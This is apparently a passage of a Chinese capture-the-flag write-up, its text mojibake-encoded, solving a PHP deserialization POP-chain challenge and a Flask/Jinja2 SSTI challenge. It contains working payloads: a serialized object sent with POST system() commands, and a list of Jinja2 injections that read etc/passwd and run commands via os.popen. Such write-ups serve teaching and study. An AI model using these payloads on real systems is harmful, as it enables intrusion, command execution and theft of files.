<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">EeEÁöÑ_cloneÊñπÊ≥ïËß¶ÂèëcycycyÁöÑaaa,
</span></span><span class="line"><span class="cl">w_wuw_wÁöÑ__invokeÊñπÊ≥ïËß¶ÂèëEeEÁöÑ__clone
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Â¶Ç‰ΩïË∞ÉÁî®__invokeÊñπÊ≥ïÔºü
</span></span><span class="line"><span class="cl">__invoke() //ÂΩìÂ∞ùËØïÂ∞ÜÂØπË±°Ë∞ÉÁî®‰∏∫ÂáΩÊï∞Êó∂Ëß¶Âèë
</span></span><span class="line"><span class="cl">__toString() //ÊääÁ±ªÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤‰ΩøÁî®Êó∂Ëß¶Âèë
</span></span><span class="line"><span class="cl">__wakeup() //ÊâßË°åunserialize()Ôºå‰ºöÂÖàË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gBoBgÁöÑ_toStringÊñπÊ≥ïÂ¶ÇÊûúËÆ©aa‰∏∫w_wuw_wÁ±ªÔºåÂàôËÉΩËß¶ÂèëwuwÁöÑ_invokeÔºå
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Â¶Ç‰ΩïËß¶ÂèëgBoBgÁöÑ_toStringÊñπÊ≥ïÔºü
</span></span><span class="line"><span class="cl">EeEÁöÑ_wakeupÊñπÊ≥ïËÉΩËß¶ÂèëgBoBgÁöÑtoString
</span></span><span class="line"><span class="cl">EeEÁöÑtextËµãÂÄº‰∏∫gBoBg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$a = new EeE();
</span></span><span class="line"><span class="cl">$a -&gt;text = new gBoBg(); // Ëß¶Âèë‰∫ÜgBoBgÁöÑ_toStringÊñπÊ≥ï
</span></span><span class="line"><span class="cl">$a -&gt;text -&gt;coos = new w_wuw_w(); // Ëß¶Âèë‰∫Üw_wuw_wÁöÑ__invokeÊñπÊ≥ï
</span></span><span class="line"><span class="cl">$a -&gt;text -&gt;file = &#34;any&#34;; 
</span></span><span class="line"><span class="cl">echo serialize($a);
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÆåÊï¥ÁöÑphpÂèçÂ∫èÂàóÂåñÊûÑÈÄ†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EeE</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$eeee</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">gBoBg</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$coos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w_wuw_w</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cycycycy</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">EeE</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">gBoBg</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span><span class="na">text</span> <span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s2">&#34;any&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span><span class="na">text</span> <span class="o">-&gt;</span><span class="na">coos</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">w_wuw_w</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Ê†áÂáÜËæìÂá∫ÔºöO:3:&#34;EeE&#34;:2:{s:4:&#34;text&#34;;O:5:&#34;gBoBg&#34;:3:{s:4:&#34;name&#34;;N;s:4:&#34;file&#34;;s:3:&#34;any&#34;;s:4:&#34;coos&#34;;O:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;N;s:4:&#34;file&#34;;N;}}s:4:&#34;eeee&#34;;N;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2Áü•ËØÜÁÇπ-1">2.Áü•ËØÜÁÇπ</h4>
<h5 id="ÂèçÂ∫èÂàóÂåñÊºèÊ¥û">ÂèçÂ∫èÂàóÂåñÊºèÊ¥û</h5>
<p>ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÊàêÂõ†Âú®‰∫é‰ª£Á†Å‰∏≠ÁöÑ <code>unserialize()</code> Êé•Êî∂ÁöÑÂèÇÊï∞ÂèØÊéßÔºåËøô‰∏™ÂáΩÊï∞ÁöÑÂèÇÊï∞ÊòØ‰∏Ä‰∏™Â∫èÂàóÂåñÁöÑÂØπË±°ÔºåËÄåÂ∫èÂàóÂåñÁöÑÂØπË±°Âè™Âê´ÊúâÂØπË±°ÁöÑÂ±ûÊÄßÔºåÂà©Áî®ÂØπÂØπË±°Â±ûÊÄßÁöÑÁØ°ÊîπÂÆûÁé∞ÊúÄÁªàÁöÑÊîªÂáª„ÄÇ</p>
<h5 id="Âà©Áî®ÊâãÊ≥ï">Âà©Áî®ÊâãÊ≥ï</h5>
<p>ÂØπË±°ÁöÑÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÂè™ËÉΩÊòØÂÖ∂‰ªñÁ±ªÁöÑÂ±ûÊÄßÔºåÁØ°ÊîπÂèçÂ∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤Âè™ËÉΩÊéßÂà∂È¢ÑÂÖàËÆæÁΩÆÂ•ΩÁöÑÂ±ûÊÄßÔºåÂ¶ÇÊûúÊÉ≥Âà©Áî®Á±ªÈáåÈù¢ÁöÑÊñπÊ≥ïÔºåÈúÄË¶ÅÂà©Áî®È≠îÊúØÊñπÊ≥ïÔºåÈ≠îÊúØÊñπÊ≥ïÁöÑË∞ÉÁî®ÊòØÂú®ËØ•Á±ªÁöÑÂ∫èÂàóÂåñÊàñËÄÖÂèçÂ∫èÂàóÂåñÁöÑÂêåÊó∂Ëá™Âä®ÂÆåÊàêÔºå‰∏çÈúÄË¶Å‰∫∫Â∑•Âπ≤È¢Ñ„ÄÇÂõ†Ê≠§Âè™Ë¶ÅÁ±ª‰∏≠Âá∫Áé∞‰∫ÜËÉΩÂà©Áî®ÁöÑÈ≠îÊúØÊñπÊ≥ïÔºåÂ∞±ËÉΩÈÄöËøáÂèçÂ∫èÂàóÂåñÔºåÊéßÂà∂ÂÖ∂ÂØπË±°Â±ûÊÄßÔºå‰ªéËÄåÂÆûÁé∞ÂØπËøô‰∫õÂáΩÊï∞ÔºàÊñπÊ≥ïÔºâÁöÑÊìçÊéß„ÄÇ</p>
<h5 id="Â∏∏ËßÅÈ≠îÊúØÊñπÊ≥ï">Â∏∏ËßÅÈ≠îÊúØÊñπÊ≥ï</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__wakeup() //ÊâßË°åunserialize()Ôºå‰ºöÂÖàË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞
</span></span><span class="line"><span class="cl">__sleep() //ÊâßË°åserialize()Ôºå‰ºöÂÖàË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞
</span></span><span class="line"><span class="cl">__destruct() //ÂØπË±°Ë¢´ÈîÄÊØÅÊó∂Ëß¶Âèë
</span></span><span class="line"><span class="cl">__call() //Âú®ÂØπË±°‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶Âèë
</span></span><span class="line"><span class="cl">__callStatic() //Âú®ÈùôÊÄÅ‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶Âèë
</span></span><span class="line"><span class="cl">__get() //Áî®‰∫é‰ªé‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄßËØªÂèñÊï∞ÊçÆÊàñËÄÖ‰∏çÂ≠òÂú®Ëøô‰∏™ÈîÆÈÉΩ‰ºöË∞ÉÁî®Ê≠§ÊñπÊ≥ï
</span></span><span class="line"><span class="cl">__set() //Áî®‰∫éÂ∞ÜÊï∞ÊçÆÂÜôÂÖ•‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄß
</span></span><span class="line"><span class="cl">__isset() //Âú®‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄß‰∏äË∞ÉÁî®isset()Êàñempty()Ëß¶Âèë
</span></span><span class="line"><span class="cl">__unset() //Âú®‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄß‰∏ä‰ΩøÁî®unset()Ëß¶Âèë
</span></span><span class="line"><span class="cl">__toString() //ÊääÁ±ªÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤‰ΩøÁî®Êó∂Ëß¶Âèë
</span></span><span class="line"><span class="cl">__invoke() //ÂΩìÂ∞ùËØïÂ∞ÜÂØπË±°Ë∞ÉÁî®‰∏∫ÂáΩÊï∞Êó∂Ëß¶Âèë
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="Âà©Áî®ËøáÁ®ã">Âà©Áî®ËøáÁ®ã</h5>
<p>1.ÂØªÊâæunserialize()ÂáΩÊï∞ÁöÑÂèÇÊï∞ÊòØÂê¶ÊúâÂèØÂà©Áî®ÁÇπÔºõ
2.ÂØªÊâæÂèçÂ∫èÂàóÂåñÁöÑÁõÆÊ†áÔºåÈáçÁÇπÂØªÊâæÂ≠òÂú® wakeup() Êàñ destruct() È≠îÊúØÊñπÊ≥ïÁöÑÁ±ªÔºõ
3.ÈÄêÂ±ÇÊü•ÁúãËØ•Á±ªÂú®È≠îÊúØÊñπÊ≥ï‰∏≠‰ΩøÁî®ÁöÑÂ±ûÊÄßÂíåÂ±ûÊÄßË∞ÉÁî®ÁöÑÊñπÊ≥ïÔºåËßÇÂØüÊòØÂê¶ÊúâÂèØÊéßÁöÑÂ±ûÊÄßÔºåÂèØ‰ª•ÂÆûÁé∞Âú®ÂΩìÂâçË∞ÉÁî®ËøáÁ®ã‰∏≠Ëß¶ÂèëÔºõ
4.ÊâæÂà∞Ë¶ÅÊéßÂà∂ÁöÑÂ±ûÊÄß‰πãÂêéÔºåÂ∞ÜË¶ÅÁî®Âà∞ÁöÑ‰ª£Á†ÅÈÉ®ÂàÜÂ§çÂà∂‰∏ãÊù•ÔºåÊûÑÈÄ†Â∫èÂàóÂåñ„ÄÇ</p>
<h5 id="phpÂèçÂ∫èÂàóÂåñpopÈìæ">PHPÂèçÂ∫èÂàóÂåñPOPÈìæ</h5>
<p>POP Èù¢ÂêëÂ±ûÊÄßÁºñÁ®ã(Property-Oriented Programing) Ôºö‰ªéÁé∞ÊúâËøêË°åÁéØÂ¢É‰∏≠ÂØªÊâæ‰∏ÄÁ≥ªÂàóÁöÑ‰ª£Á†ÅÊàñËÄÖÊåá‰ª§Ë∞ÉÁî®ÔºåÁÑ∂ÂêéÊ†πÊçÆÈúÄÊ±ÇÊûÑÊàê‰∏ÄÁªÑËøûÁª≠ÁöÑË∞ÉÁî®Èìæ,ÊúÄÁªàËææÂà∞ÊîªÂáªÁõÆÁöÑ„ÄÇ</p>
<p>ÂèçÂ∫èÂàóÂåñPOPÈìæÊòØÈÄöËøáÊéßÂà∂ÂØπË±°ÁöÑÂ±ûÊÄßÊù•ÂÆûÁé∞ÊéßÂà∂Á®ãÂ∫èÁöÑÊâßË°åÊµÅÁ®ãÔºåËøõËÄåÂÆûÁé∞Âà©Áî®Êú¨Ë∫´‰ª£Á†ÅËææÂà∞ÊîªÂáªÁõÆÁöÑ„ÄÇ</p>
<h4 id="3payload-1">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bpÊäìÂåÖÔºö
</span></span><span class="line"><span class="cl">Âú®headerÈÉ®ÂàÜÊ∑ªÂä†
</span></span><span class="line"><span class="cl">AAAAAA:
</span></span><span class="line"><span class="cl">O:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;R:2;s:4:&#34;file&#34;;s:9:&#34;check.php&#34;;}
</span></span><span class="line"><span class="cl">ÂæóÂà∞check.phpÊ∫êÁ†ÅÔºåÂÖ∂‰∏∫Âä†ÂØÜËÑöÊú¨ÔºåÂà©Áî®Â∑≤Áü•ÂØÜÊñáÔºåËøõË°åËß£ÂØÜÔºåÂæóÂà∞fe1ka1ele1efp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÊúÄÁªàÊûÑÈÄ†payloadÔºö
</span></span><span class="line"><span class="cl">GET:
</span></span><span class="line"><span class="cl">?get=fe1ka1ele1efp
</span></span><span class="line"><span class="cl">POST:
</span></span><span class="line"><span class="cl">system(&#34;ls /&#34;);
</span></span><span class="line"><span class="cl">system(&#34;tac /f1agaaa&#34;);
</span></span><span class="line"><span class="cl">Header:
</span></span><span class="line"><span class="cl">AAAAAA: O:3:&#34;EeE&#34;:2:{s:4:&#34;text&#34;;O:5:&#34;gBoBg&#34;:3:{s:4:&#34;name&#34;;N;s:4:&#34;file&#34;;s:3:&#34;any&#34;;s:4:&#34;coos&#34;;O:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;N;s:4:&#34;file&#34;;N;}}s:4:&#34;eeee&#34;;N;}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_ssti">easy_ssti</h2>
<h4 id="1ÂÅöÈ¢òÊÄùË∑Ø-2">1.ÂÅöÈ¢òÊÄùË∑Ø</h4>
<p>Êü•ÁúãÈ¢òÁõÆÊ∫êÁ†ÅÔºå‰∏ãËΩΩÂéãÁº©ÂåÖapp.zipÔºåËß£ÂéãÂæóÂà∞app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template_string</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hello/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;hello.html&#39;</span><span class="p">,</span><span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hello/&lt;name&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hellodear</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;ge&#34;</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;hello </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="s2">&#34;f&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;hello </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Nonononon&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèëÁé∞‰∫ÜpythonÁöÑflaskÊ°ÜÊû∂ÔºåÈúÄË¶ÅËÆøÈóÆ/hello.htmlÔºåÊãºÊé•Ôºö/hello/{{payload}}ËøõË°åÊ≥®ÂÖ•</p>
<p>ËØï‰∏Ä‰∏ã{{1+1}}ÔºåÈ°µÈù¢ËøîÂõû2ÔºåËØÅÊòé‰ª£Á†ÅÊâßË°åÊàêÂäüÔºåÂ≠òÂú®SSTIÊ≥®ÂÖ•„ÄÇ</p>
<h4 id="2sstiÊ≥®ÂÖ•">2.SSTIÊ≥®ÂÖ•</h4>
<h5 id="sstiÊºèÊ¥ûÂéüÁêÜ">sstiÊºèÊ¥ûÂéüÁêÜ</h5>
<p>SSTIÔºàserver-side template injection)‰∏∫ÊúçÂä°Á´ØÊ®°ÊùøÊ≥®ÂÖ•ÊîªÂáªÔºåÂÆÉ‰∏ªË¶ÅÊòØÁî±‰∫éÊ°ÜÊû∂ÁöÑ‰∏çËßÑËåÉ‰ΩøÁî®ËÄåÂØºËá¥ÁöÑ„ÄÇ</p>
<p>‰∏ªË¶Å‰∏∫pythonÁöÑ‰∏Ä‰∫õÊ°ÜÊû∂ÔºåÂ¶Ç jinja2 mako tornado django flask„ÄÅPHPÊ°ÜÊû∂smarty twig thinkphp„ÄÅjavaÊ°ÜÊû∂jade velocity springÁ≠âÁ≠â‰ΩøÁî®‰∫ÜÊ∏≤ÊüìÂáΩÊï∞Êó∂ÔºåÁî±‰∫é‰ª£Á†Å‰∏çËßÑËåÉÊàñ‰ø°‰ªª‰∫ÜÁî®Êà∑ËæìÂÖ•ËÄåÂØºËá¥‰∫ÜÊúçÂä°Á´ØÊ®°ÊùøÊ≥®ÂÖ•ÔºåÊ®°ÊùøÊ∏≤ÊüìÂÖ∂ÂÆûÂπ∂Ê≤°ÊúâÊºèÊ¥ûÔºå‰∏ªË¶ÅÊòØÁ®ãÂ∫èÂëòÂØπ‰ª£Á†Å‰∏çËßÑËåÉ‰∏ç‰∏•Ë∞®ÈÄ†Êàê‰∫ÜÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÈÄ†ÊàêÊ®°ÊùøÂèØÊéß„ÄÇ</p>
<p><strong>ÂΩìÁî®Êà∑ÁöÑËæìÂÖ•Êï∞ÊçÆÊ≤°ÊúâË¢´ÂêàÁêÜÁöÑÂ§ÑÁêÜÊéßÂà∂Êó∂ÔºåÂ∞±ÊúâÂèØËÉΩÊï∞ÊçÆÊèíÂÖ•‰∫ÜÁ®ãÂ∫èÊÆµ‰∏≠ÂèòÊàê‰∫ÜÁ®ãÂ∫èÁöÑ‰∏ÄÈÉ®ÂàÜÔºå‰ªéËÄåÊîπÂèò‰∫ÜÁ®ãÂ∫èÁöÑÊâßË°åÈÄªËæë</strong>„ÄÇ</p>
<h5 id="flaskÁöÑjinja2ÂºïÊìéÂà©Áî®ÊâãÊ≥ï">flaskÁöÑjinja2ÂºïÊìéÂà©Áî®ÊâãÊ≥ï</h5>
<p>{{}}Âú®Jinja2‰∏≠‰Ωú‰∏∫ÂèòÈáèÂåÖË£πÊ†áËØÜÁ¨¶ÔºåJinja2Âú®Ê∏≤ÊüìÁöÑÊó∂ÂÄô‰ºöÊää{{}}ÂåÖË£πÁöÑÂÜÖÂÆπÂΩìÂÅöÂèòÈáèËß£ÊûêÊõøÊç¢„ÄÇÊØîÂ¶Ç{{1+1}}‰ºöË¢´Ëß£ÊûêÊàê2„ÄÇÂ¶ÇÊ≠§‰∏ÄÊù•Â∞±ÂèØ‰ª•ÂÆûÁé∞Â¶ÇÂêåsqlÊ≥®ÂÖ•‰∏ÄÊ†∑ÁöÑÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ</p>
<h5 id="Â∏∏Áî®ÁöÑÊûÑÈÄ†ËØ≠Âè•">Â∏∏Áî®ÁöÑÊûÑÈÄ†ËØ≠Âè•</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Êó†ËøáÊª§
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># ËØªÊñá‰ª∂
</span></span><span class="line"><span class="cl">#ËØªÂèñÊñá‰ª∂Á±ªÔºå&lt;type ‚Äòfile‚Äô&gt; file‰ΩçÁΩÆ‰∏ÄËà¨‰∏∫40ÔºåÁõ¥Êé•Ë∞ÉÁî®
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[40](&#39;flag&#39;).read()}} 
</span></span><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).readlines()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[257](&#39;flag&#39;).read()}} (python3)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Áõ¥Êé•‰ΩøÁî®popenÂëΩ‰ª§Ôºåpython2ÊòØÈùûÊ≥ïÁöÑÔºåÂè™Èôê‰∫épython3
</span></span><span class="line"><span class="cl">os._wrap_close Á±ªÈáåÊúâpopen
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Ë∞ÉÁî®osÁöÑpopenÊâßË°åÂëΩ‰ª§
</span></span><span class="line"><span class="cl">#python2„ÄÅpython3ÈÄöÁî®
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /flag&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat /flag&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">#python3‰∏ìÂ±û
